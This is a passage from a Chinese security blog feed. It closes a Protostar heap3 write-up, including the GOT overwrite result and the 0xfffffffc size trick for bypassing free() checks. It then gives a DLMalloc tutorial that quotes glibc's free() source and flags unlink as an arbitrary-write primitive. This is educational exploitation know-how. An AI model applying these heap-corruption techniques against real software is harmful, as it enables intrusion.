alt="0-6"><br>GoT地址已经修改，下面可以看到已经执行了winnwe()函数<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-7.png?raw=true" alt="0-7"></p><h2 id="0x04-一点补充"><a href="#0x04-一点补充" class="headerlink" title="0x04 一点补充"></a>0x04 一点补充</h2><p>在上面构造chunk中，也许你已经发现了chunk大小为<code>0xfffffffc</code>，这是一个什么巧妙的方法去绕过free()里面的检查等。具体的细节可以看<br><a href="http://phrack.org/issues/57/9.html#article" target="_blank" rel="external">Once upon a free()</a>这篇文章，简单的说就是当某个数加上<code>0xfffffffc</code>时会造成溢出相当于减4从而使其向前偏移4个字节，绕过检查，避免崩溃。</p><h2 id="0x05-堆漏洞学习总结"><a href="#0x05-堆漏洞学习总结" class="headerlink" title="0x05 堆漏洞学习总结"></a>0x05 堆漏洞学习总结</h2><p>目前可能这是最后一个堆漏洞的学习，这个堆漏洞的学习理解到动手前后花费了大量时间，不过这都是值得的，如果能够坚持下来，将会对堆漏洞有一个清晰的认识。以后再遇到漏洞或者别人的分析能够快速准确的理解。虽然现在堆管理代码经过了很多改善和patch，但基本和关键的技术还是没变。所以keep hacking!</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 学习最后一个堆溢出漏洞，在这之前，强烈建议先阅读下我之前对&lt;a href=&quot;ht
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"/>
    
      <category term="Protostar" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"/>
    
      <category term="堆溢出" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
      <category term="metadata" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/metadata/"/>
    
      <category term="DLMalloc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/DLMalloc/"/>
    
  </entry>
  
  <entry>
    <title>深入理解Linux堆分配器-DLMalloc</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/23/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/23/Linux堆分配器-DLMalloc/Linux堆分配器-DLMalloc/</id>
    <published>2017-04-23T04:16:00.000Z</published>
    <updated>2017-05-02T14:36:05.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p> 当学习漏洞利用到一定阶段的时候，就需要对操作系统层面有足够的认识。无疑Linux的堆管理一直是不能甚解。因此这篇文章将对Linux的DLMalloc进行详细的介绍，以此对操作系统的堆管理有一个清晰整体的认识，当我在学习的过程中，好像没有发现一篇中文文章来详细介绍相关内容，所以本文仅仅是我通过学习和实践得到的理解，若有不对，请指出。</p></blockquote><h2 id="0x01-目录"><a href="#0x01-目录" class="headerlink" title="0x01 目录"></a>0x01 目录</h2><p>1.DLMalloc<br>2.内存Chunk<br>3.Bin<br>4.malloc源码free()函数分析</p><h2 id="0x02-DLMalloc"><a href="#0x02-DLMalloc" class="headerlink" title="0x02 DLMalloc"></a>0x02 DLMalloc</h2><p>Doug Lea’s Malloc (dlmalloc)是一个GNU C库的内存分配器，它能够通过calloc(),malloc(), free()和realloc()等动态分配和释放的函数来管理内存。<br>明显内存分配器在操作系统中是相当重要的，主要在需要满足下列的特点：</p><ul><li>稳定性(stability)</li><li>性能(performance)</li><li>避免碎片化(avoidance of fragmentation)</li><li>低空间开销(low space overhead）<br>根据上面的内存特点，将有助于后面对chunk以及Bin等的理解。</li></ul><h2 id="0x03-内存chunk"><a href="#0x03-内存chunk" class="headerlink" title="0x03 内存chunk"></a>0x03 内存chunk</h2><p>1.什么是chunk？<br>chunk是堆中一些连续的内存块，可以用作分配，释放，拆分，合并。不存在两个连续的释放chunk，这是在于相邻的chunk会合并。</p><p>2.数据结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">struct malloc_chunk &#123;</div><div class="line">INTERNAL_SIZE_T prev_size; //当前chunk前一个chunk的大小，仅在前一个为freed才使用</div><div class="line">INTERNAL_SIZE_T size;      //当前chunk的大小</div><div class="line">struct malloc_chunk * fd;  //如果当前为释放chunk，指向双向free list中前一个chunk</div><div class="line">struct malloc_chunk * bk;  //如果当前为释放chunk，指向双向free list中后一个chunk</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>根据上面的描述我们可以知道，chunk在分配时和释放时数据结构是不同的，看下面的图例:</p><ul><li>allocate chunk<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/0-0.png?raw=true" alt="0-0"></li></ul><ul><li>freed chunk<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/0-1.png?raw=true" alt="0-1"></li></ul><p>3.更多细节<br>因为chunk是按照8字节对齐的，所以当前块中的size低三位将用作相关标志，从右到左A M P分别代表：是否在主heap？是否通过mmap()分配？前一个chunk是否在使用？<br>然后可以想到有一个最小chunk的存在，其大小为16字节()。  </p><p>4.特殊chunk<br>top chunk:指可能内存边界的末端，也被称作wilderness chunk。如果其他bin都不满足malloc的情况下，就会从top chunk里去一部分去满足分配请求，剩余的则作为新的top chunk，并且top chunk不在任何一个bin中。随着被分离和合并top chunk会增大和减小。</p><p>last_remainder:和top chunk一样，不在任何一个bin中，但最终可能会合并到一个bin中。可以看英文原文解释：The last_remainder chunk is the result of allocation requests for small chunks that have no exact fit in any of the bins. If the request is larger than the last_remainder chunk but smaller than a block in a bin, then the chunk is split again. The last_remainder chunk is the result of having to split a larger chunk into two, one part of it is handed out from the allocation, and the other because the last_remainder chunk.</p><h2 id="0x04-Bin"><a href="#0x04-Bin" class="headerlink" title="0x04 Bin"></a>0x04 Bin</h2><p>chunk一旦被释放后就会被存储在叫做Bin的链表中，Bin有不同大小的链表，方便与下次查找到最适当的chunk。通常来说有small-bin，large-bin，fast-bin。<br>这里我主要介绍fsatbin和normalbin</p><p>(1)fastbin：是一种单链表bin，不同系统定义了一个最大值，当chunk大小小于等于这个最大值时，就会被释放到fastbin中，正如名字那样，为了更快的free和malloc，这个链表是无序的，是后进先出（LIFO），并且不与其他chunk合并。<br>(2)normalbin:是一种双向链表bin，当chunk大小大于fastbin的大小时就会被放入这个bin，并且有着各种大小的normalbin(减少碎片)，bin内部的chunk按大小组织起来。释放后会于相邻的chunk合并。</p><h2 id="0x05-free-源代码分析及相关细节"><a href="#0x05-free-源代码分析及相关细节" class="headerlink" title="0x05 free()源代码分析及相关细节"></a>0x05 free()源代码分析及相关细节</h2><p><code>free(void *mem)--&gt;__libc_free(void *mem)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">void</div><div class="line">__libc_free (void *mem)</div><div class="line">&#123;</div><div class="line">  mstate ar_ptr;</div><div class="line">  mchunkptr p;                          /* chunk corresponding to mem */</div><div class="line"></div><div class="line">  void (*hook) (void *, const void *)</div><div class="line">    = atomic_forced_read (__free_hook);</div><div class="line">  if (__builtin_expect (hook != NULL, 0))</div><div class="line">    &#123;</div><div class="line">      (*hook)(mem, RETURN_ADDRESS (0));</div><div class="line">      return;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  if (mem == 0)                              /* free(0) has no effect */</div><div class="line">    return;</div><div class="line"></div><div class="line">  p = mem2chunk (mem);</div><div class="line"></div><div class="line">  if (chunk_is_mmapped (p))                       /* release mmapped memory. */</div><div class="line">    &#123;</div><div class="line">      /* See if the dynamic brk/mmap threshold needs adjusting.</div><div class="line">         Dumped fake mmapped chunks do not affect the threshold.  */</div><div class="line">      if (!mp_.no_dyn_threshold</div><div class="line">          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold</div><div class="line">          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX</div><div class="line">          &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p))</div><div class="line">        &#123;</div><div class="line">          mp_.mmap_threshold = chunksize (p);</div><div class="line">          mp_.trim_threshold = 2 * mp_.mmap_threshold;</div><div class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,</div><div class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</div><div class="line">        &#125;</div><div class="line">      munmap_chunk (p);</div><div class="line">      return;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  ar_ptr = arena_for_chunk (p);</div><div class="line">  _int_free (ar_ptr, p, 0); //跳转到_int_free</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>我们先不关注其他的，只需要知道会调用_int_free就就可以了</p><p><code>__libc_free(void *mem)--&gt;_int_free (mstate av, mchunkptr p, int have_lock)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div></pre></td><td class="code"><pre><div class="line">static void</div><div class="line">_int_free (mstate av, mchunkptr p, int have_lock)</div><div class="line">&#123;</div><div class="line">  INTERNAL_SIZE_T size;        /* 当前chunk的大小 */</div><div class="line">  mfastbinptr *fb;             /* 相关的fastbin */</div><div class="line">  mchunkptr nextchunk;         /* 下一个相邻的chunk */</div><div class="line">  INTERNAL_SIZE_T nextsize;    /* 下一个chunk的大小 */</div><div class="line">  int nextinuse;               /* 下一个chunk正在使用时为真 */</div><div class="line">  INTERNAL_SIZE_T prevsize;    /* 前一个chunk的大小 */</div><div class="line">  mchunkptr bck;               /* 指向free链表中向后一个chunk */</div><div class="line">  mchunkptr fwd;               /* 指向free链表中向前一个chunk */</div><div class="line"></div><div class="line">  const char *errstr = NULL;</div><div class="line">  int locked = 0;</div><div class="line"></div><div class="line">  size = chunksize (p);</div><div class="line"></div><div class="line">  /* Little security check which won&apos;t hurt performance: the</div><div class="line">     allocator never wrapps around at the end of the address space.</div><div class="line">     Therefore we can exclude some size values which might appear</div><div class="line">     here by accident or by &quot;design&quot; from some intruder.  */</div><div class="line">  //一些安全检查</div><div class="line">  if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)</div><div class="line">      || __builtin_expect (misaligned_chunk (p), 0))</div><div class="line">    &#123;</div><div class="line">      errstr = &quot;free(): invalid pointer&quot;;</div><div class="line">    errout:</div><div class="line">      if (!have_lock &amp;&amp; locked)</div><div class="line">        __libc_lock_unlock (av-&gt;mutex);</div><div class="line">      malloc_printerr (check_action, errstr, chunk2mem (p), av);</div><div class="line">      return;</div><div class="line">    &#125;</div><div class="line">  /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT.  */</div><div class="line">   //检查是否满足大于等于最小大小</div><div class="line">  if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</div><div class="line">    &#123;</div><div class="line">      errstr = &quot;free(): invalid size&quot;;</div><div class="line">      goto errout;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  check_inuse_chunk(av, p); //检查当前chunk是否在使用</div><div class="line"></div><div class="line">  /*</div><div class="line">    如果满足，则将该chunk放入fastbin以便malloc时能够快速找到和使用</div><div class="line">  */</div><div class="line">  if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())</div><div class="line"></div><div class="line">#if TRIM_FASTBINS</div><div class="line">      /*</div><div class="line">        If TRIM_FASTBINS set, don&apos;t place chunks</div><div class="line">        bordering top into fastbins</div><div class="line">      */</div><div class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</div><div class="line">#endif</div><div class="line">      ) &#123;</div><div class="line"></div><div class="line">    if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))</div><div class="line">                          &lt;= 2 * SIZE_SZ, 0)</div><div class="line">        || __builtin_expect (chunksize (chunk_at_offset (p, size))</div><div class="line">                             &gt;= av-&gt;system_mem, 0))</div><div class="line">      &#123;</div><div class="line">        /* We might not have a lock at this point and concurrent modifications</div><div class="line">           of system_mem might have let to a false positive.  Redo the test</div><div class="line">           after getting the lock.  */</div><div class="line">        if (have_lock</div><div class="line">            || (&#123; assert (locked == 0);</div><div class="line">                  __libc_lock_lock (av-&gt;mutex);</div><div class="line">                  locked = 1;</div><div class="line">                  chunksize_nomask (chunk_at_offset (p, size)) &lt;= 2 * SIZE_SZ</div><div class="line">                    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</div><div class="line">              &#125;))</div><div class="line">          &#123;</div><div class="line">            errstr = &quot;free(): invalid next size (fast)&quot;;</div><div class="line">            goto errout;</div><div class="line">          &#125;</div><div class="line">        if (! have_lock)</div><div class="line">          &#123;</div><div class="line">            __libc_lock_unlock (av-&gt;mutex);</div><div class="line">            locked = 0;</div><div class="line">          &#125;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);</div><div class="line"></div><div class="line">    set_fastchunks(av);</div><div class="line">    unsigned int idx = fastbin_index(size);</div><div class="line">    fb = &amp;fastbin (av, idx);</div><div class="line"></div><div class="line">    /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</div><div class="line">    mchunkptr old = *fb, old2;</div><div class="line">    unsigned int old_idx = ~0u;</div><div class="line">    do</div><div class="line">      &#123;</div><div class="line">        /* Check that the top of the bin is not the record we are going to add</div><div class="line">           (i.e., double free).  */</div><div class="line">        if (__builtin_expect (old == p, 0))</div><div class="line">          &#123;</div><div class="line">            errstr = &quot;double free or corruption (fasttop)&quot;;</div><div class="line">            goto errout;</div><div class="line">          &#125;</div><div class="line">        /* Check that size of fastbin chunk at the top is the same as</div><div class="line">           size of the chunk that we are adding.  We can dereference OLD</div><div class="line">           only if we have the lock, otherwise it might have already been</div><div class="line">           deallocated.  See use of OLD_IDX below for the actual check.  */</div><div class="line">        if (have_lock &amp;&amp; old != NULL)</div><div class="line">          old_idx = fastbin_index(chunksize(old));</div><div class="line">        p-&gt;fd = old2 = old;</div><div class="line">      &#125;</div><div class="line">    while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</div><div class="line"></div><div class="line">    if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect (old_idx != idx, 0))</div><div class="line">      &#123;</div><div class="line">        errstr = &quot;invalid fastbin entry (free)&quot;;</div><div class="line">        goto errout;</div><div class="line">      &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  /*</div><div class="line">    Consolidate other non-mmapped chunks as they arrive.</div><div class="line">  */</div><div class="line">  //检查是否是通过mmap()分配的内存</div><div class="line">  else if (!chunk_is_mmapped(p)) &#123;</div><div class="line">    if (! have_lock) &#123;</div><div class="line">      __libc_lock_lock (av-&gt;mutex);</div><div class="line">      locked = 1;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    nextchunk = chunk_at_offset(p, size);//返回下一个chunk的地址</div><div class="line"></div><div class="line">    /* Lightweight tests: check whether the block is already the</div><div class="line">       top block.  */</div><div class="line">    //检查下一个是否为top-chunk</div><div class="line">    if (__glibc_unlikely (p == av-&gt;top))</div><div class="line">      &#123;</div><div class="line">        errstr = &quot;double free or corruption (top)&quot;;</div><div class="line">        goto errout;</div><div class="line">      &#125;</div><div class="line">    /* Or whether the next chunk is beyond the boundaries of the arena.  */</div><div class="line">    if (__builtin_expect (contiguous (av)</div><div class="line">                          &amp;&amp; (char *) nextchunk</div><div class="line">                          &gt;= ((char *) av-&gt;top + chunksize(av-&gt;top)), 0))</div><div class="line">      &#123;</div><div class="line">        errstr = &quot;double free or corruption (out)&quot;;</div><div class="line">        goto errout;</div><div class="line">      &#125;</div><div class="line">    /* Or whether the block is actually not marked used.  */</div><div class="line">    if (__glibc_unlikely (!prev_inuse(nextchunk)))</div><div class="line">      &#123;</div><div class="line">        errstr = &quot;double free or corruption (!prev)&quot;;</div><div class="line">        goto errout;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">    nextsize = chunksize(nextchunk);</div><div class="line">    if (__builtin_expect (chunksize_nomask (nextchunk) &lt;= 2 * SIZE_SZ, 0)</div><div class="line">        || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0))</div><div class="line">      &#123;</div><div class="line">        errstr = &quot;free(): invalid next size (normal)&quot;;</div><div class="line">        goto errout;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);</div><div class="line"></div><div class="line">    /* 与后面chunk一个合并 */</div><div class="line">    if (!prev_inuse(p)) &#123;</div><div class="line">      prevsize = prev_size (p);</div><div class="line">      size += prevsize;</div><div class="line">      p = chunk_at_offset(p, -((long) prevsize));</div><div class="line">      unlink(av, p, bck, fwd);//将后一个chunk从双向链表上取下来</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (nextchunk != av-&gt;top) &#123;</div><div class="line">      /* get and clear inuse bit */</div><div class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</div><div class="line"></div><div class="line">      /* 与前面chunk一个合并*/</div><div class="line">      if (!nextinuse) &#123;</div><div class="line">        unlink(av, nextchunk, bck, fwd);//将前一个chunk从双向链表上取下来</div><div class="line">        size += nextsize;</div><div class="line">      &#125; else</div><div class="line">        clear_inuse_bit_at_offset(nextchunk, 0);</div><div class="line"></div><div class="line">      /*</div><div class="line">        Place the chunk in unsorted chunk list. Chunks are</div><div class="line">        not placed into regular bins until after they have</div><div class="line">        been given one chance to be used in malloc.</div><div class="line">      */</div><div class="line"></div><div class="line">      bck = unsorted_chunks(av);</div><div class="line">      fwd = bck-&gt;fd;</div><div class="line">      if (__glibc_unlikely (fwd-&gt;bk != bck))</div><div class="line">        &#123;</div><div class="line">          errstr = &quot;free(): corrupted unsorted chunks&quot;;</div><div class="line">          goto errout;</div><div class="line">        &#125;</div><div class="line">      p-&gt;fd = fwd;</div><div class="line">      p-&gt;bk = bck;</div><div class="line">      if (!in_smallbin_range(size))</div><div class="line">        &#123;</div><div class="line">          p-&gt;fd_nextsize = NULL;</div><div class="line">          p-&gt;bk_nextsize = NULL;</div><div class="line">        &#125;</div><div class="line">      bck-&gt;fd = p;</div><div class="line">      fwd-&gt;bk = p;</div><div class="line"></div><div class="line">      set_head(p, size | PREV_INUSE);</div><div class="line">      set_foot(p, size);</div><div class="line"></div><div class="line">      check_free_chunk(av, p);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    /*</div><div class="line">      如果当前chunk正好与topchunk相邻，则合并到topchunk</div><div class="line">    */</div><div class="line"></div><div class="line">    else &#123;</div><div class="line">      size += nextsize;</div><div class="line">      set_head(p, size | PREV_INUSE);</div><div class="line">      av-&gt;top = p;</div><div class="line">      check_chunk(av, p);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    /*</div><div class="line">      If freeing a large space, consolidate possibly-surrounding</div><div class="line">      chunks. Then, if the total unused topmost memory exceeds trim</div><div class="line">      threshold, ask malloc_trim to reduce top.</div><div class="line"></div><div class="line">      Unless max_fast is 0, we don&apos;t know if there are fastbins</div><div class="line">      bordering top, so we cannot tell for sure whether threshold</div><div class="line">      has been reached unless fastbins are consolidated.  But we</div><div class="line">      don&apos;t want to consolidate on each free.  As a compromise,</div><div class="line">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</div><div class="line">      is reached.</div><div class="line">    */</div><div class="line"></div><div class="line">    if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</div><div class="line">      if (have_fastchunks(av))</div><div class="line">        malloc_consolidate(av);</div><div class="line"></div><div class="line">      if (av == &amp;main_arena) &#123;</div><div class="line">#ifndef MORECORE_CANNOT_TRIM</div><div class="line">        if ((unsigned long)(chunksize(av-&gt;top)) &gt;=</div><div class="line">            (unsigned long)(mp_.trim_threshold))</div><div class="line">          systrim(mp_.top_pad, av);</div><div class="line">#endif</div><div class="line">      &#125; else &#123;</div><div class="line">        /* Always try heap_trim(), even if the top chunk is not</div><div class="line">           large, because the corresponding heap might go away.  */</div><div class="line">        heap_info *heap = heap_for_ptr(top(av));</div><div class="line"></div><div class="line">        assert(heap-&gt;ar_ptr == av);</div><div class="line">        heap_trim(heap, mp_.top_pad);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (! have_lock) &#123;</div><div class="line">      assert (locked);</div><div class="line">      __libc_lock_unlock (av-&gt;mutex);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  /*</div><div class="line">    If the chunk was allocated via mmap, release via munmap().</div><div class="line">  */</div><div class="line"></div><div class="line">  else &#123;</div><div class="line">    munmap_chunk (p);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>这里看看<code>unlink()</code>宏定义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#define unlink( P, BK, FD ) &#123;            </div><div class="line">    BK = P-&gt;bk;                          </div><div class="line">    FD = P-&gt;fd;                          </div><div class="line">    FD-&gt;bk = BK;  //可能会造成任意写                       </div><div class="line">    BK-&gt;fd = FD;                         </div><div class="line">&#125;</div></pre></td></tr></table></figure><p>现在我们重点放在<code>unlink()</code>，当两个相邻chunk需要合并的时候，势必需要将临近的chunk从原来的双链表上取下来，然后与当前chunk合并成一个更大的块。等等！怎么取下来的呢？如果这里存在一个恶意的chunk即fd和bk都是一些恶意地址指针，则会出现任意地址写的一个漏洞。在这里我们就先不去讨论进一步的利用过程，只需知道存在一个这样的漏洞即可，后面会根据这个分析去漏洞利用。</p><p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#__libc_free" target="_blank" rel="external">glibc/malloc.c源码</a></p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><ol><li><a href="http://phrack.org/issues/57/8.html#article" target="_blank" rel="external">Vudo malloc tricks</a></li><li><a href="http://gee.cs.oswego.edu/dl/html/malloc.html" target="_blank" rel="external">A Memory Allocator</a></li><li><a href="http://phrack.org/issues/57/9.html#article" target="_blank" rel="external">Once upon a free()</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 当学习漏洞利用到一定阶段的时候，就需要对操作系统层面有足够的认识。无疑Linux
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/linux/"/>
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
      <category term="malloc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/malloc/"/>
    
      <category term="free" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/free/"/>
    
  </entry>
  
  <entry>
